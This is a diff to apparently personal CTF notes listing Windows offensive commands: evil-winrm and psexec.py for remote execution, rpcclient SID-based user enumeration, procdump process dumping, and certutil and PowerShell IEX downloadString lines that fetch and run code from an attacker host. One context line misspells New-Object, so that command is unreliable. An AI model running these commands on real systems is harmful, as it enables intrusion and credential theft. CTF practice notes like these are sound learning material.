@@ -14,6 +14,8 @@ notes gathered from doing numerous CTFs to help with further CTFs
 <p> ssh -i [private rsa] [user]@[ip]
 <p> - impacket tools location on kali
 <p> /usr/share/doc/python3-impacket/examples/
+<p> use evilwinrm for when you have winrm access and want RCE
+
 <p> -----------------------------------------------------------------------------------------
 </p>
 <p> upgrade shell using python pty library and adds auto complete for steps 2+ :
@@ -31,7 +33,11 @@ notes gathered from doing numerous CTFs to help with further CTFs
 <p> select [table value] from [table]; (shows items inside the table values of the table)
 <p> -----------------------------------------------------------------------------------------
 <p> - use rpcclient to :
-<p> rpcclient
+<p> rpcclient -U '[found user]%[found password]' [ip]
+<p> > lookupnames administrator
+<p> > lookupsids [copied SID and incremen the last octet by one for user enumeration]
+<p> > e.g. SID: administrator s-1-5-21-4254423774-1266059056-3197185112-500 [last octet = 500, users are 1000+]
+<p> 
 
 <p> -----------------------------------------------------------------------------------------
 <p> - file upload (works with powershell and linux):
@@ -79,12 +85,17 @@ notes gathered from doing numerous CTFs to help with further CTFs
 
 Windows:
 
-windows powershell locations:
-c:\Windows\System32\    - 32 bit
-c:\Windows\SysWow64\    - 32 bit
-c:\Windows\SysNative\   - 64 bit
-
-
+<p> windows powershell locations:
+<p> c:\Windows\System32\    - 32 bit
+<p> c:\Windows\SysWow64\    - 32 bit
+<p> c:\Windows\SysNative\   - 64 bit
+<p> sysinternals:
+<p> dump process using the ID given from Get-Process command
+<p> .\procdump64.exe
+<p> - if you have write access to SMB shares use this for RCE
+<p> psexec.py [user]@[ip]
+<p> - get current running processes using powershell:
+<p> powershell Get-Process
 File download:
 cmd.exe
 - certutil -urlcache -f http://<ip>:<port>/<file> <file output>
@@ -95,3 +106,5 @@ powershell IEX(New-Object Net.WebClient).downloadString("http://<ip>:<port>/<fil
 - using powershell directly causes reverse shell crash:
 echo 'IEX(Net-Object Net.WebClient).downloadString("http://<ip>:<port>/<file>")' | powershell -noprofile - 
   
+
+
